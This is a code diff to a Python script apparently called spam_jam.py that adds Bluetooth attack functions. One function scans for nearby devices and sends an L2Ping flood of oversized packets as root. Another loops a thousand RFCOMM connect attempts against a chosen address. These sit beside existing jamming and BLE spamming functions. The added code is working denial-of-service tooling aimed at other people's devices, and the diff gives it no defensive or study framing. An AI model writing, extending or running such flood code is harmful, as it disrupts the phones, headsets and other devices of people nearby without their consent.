@@ -83,6 +83,49 @@ def classic_jam():
         except subprocess.CalledProcessError:
             print(f"⚠️ Attempt {i+1}: Failed to connect to {target_mac}")
 
+# 💥 L2Ping Flood
+def l2ping_attack():
+    devices = interactive_ble_scan()
+    if not devices:
+        return
+    try:
+        idx = int(input("💜 Enter index of device to L2Ping: "))
+        addr = devices[idx].addr
+    except (ValueError, IndexError):
+        print("⚠️ Invalid selection.")
+        return
+
+    if os.geteuid() != 0:
+        print("⚠️ L2Ping needs root! Try: sudo python3 spam_jam.py")
+        return
+
+    print(f"💥 Sending L2Ping flood to {addr}")
+    try:
+        subprocess.run(['l2ping', '-c', '100', '-s', '600', addr], check=True)
+        print("✅ L2Ping attack successful!")
+    except subprocess.CalledProcessError:
+        print(f"⚠️ Failed. Device may be offline.")
+
+# ✅ RFCOMM Flood
+def rfcomm_flood():
+    devices = interactive_ble_scan()
+    if not devices:
+        return
+    try:
+        idx = int(input("💜 Enter index of device for RFCOMM Flood: "))
+        addr = devices[idx].addr
+    except (ValueError, IndexError):
+        print("⚠️ Invalid selection.")
+        return
+
+    print(f"💥 Starting RFCOMM flood on {addr}...")
+    for i in range(1000):
+        try:
+            subprocess.run(['rfcomm', 'connect', addr, '1'], check=True)
+            print(f"✅ Attempt {i+1}: Connected")
+        except subprocess.CalledProcessError:
+            print(f"⚠️ Attempt {i+1}: Failed")
+
 # 🚀 Spam Single BLE Device
 def spam_ble():
     devices = interactive_ble_scan()
